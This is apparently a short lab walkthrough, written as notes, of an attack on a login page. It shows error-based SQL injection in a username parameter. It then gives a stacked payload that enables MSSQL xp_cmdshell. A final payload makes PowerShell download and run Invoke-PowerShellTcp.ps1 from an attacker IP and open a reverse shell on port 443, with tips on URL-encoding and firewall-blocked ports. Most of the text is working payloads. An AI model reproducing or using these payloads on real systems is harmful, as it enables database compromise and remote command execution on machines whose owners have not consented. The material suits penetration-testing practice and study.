- Navigate to the login page and capture the login request using burpsuite. Both `error`-based and `time`-based SQL injection will identify SQLi at `24UsernameTextBox`parameter. For the sake of demonstration, `error`-based SQL injection `1' 1234 -- //` is used here.![[Pasted image 20240125015149.png]]
- Upon identifying the SQLi, enable `xp_cmdshell` with another one-liner SQL injection .
	```
	1'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')waitfor delay '0:0:10' -- //
	```
	- Remember to URL-encode!
- After successful enable of `xp_cmdshell`, set up web server and retrieve and execute `Invoke-PowerShellTcp.ps1` with another SQL injection.
	```
	1'EXEC master.dbo.xp_cmdshell 'powershell.exe -c iex(iwr http://192.168.45.203:80/Windows/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.203 -Port 443'waitfor delay '0:0:5' -- //
	```
	- Remember to URL-encode
	- Port 4444 does not work here. Blocked by firewall possibly.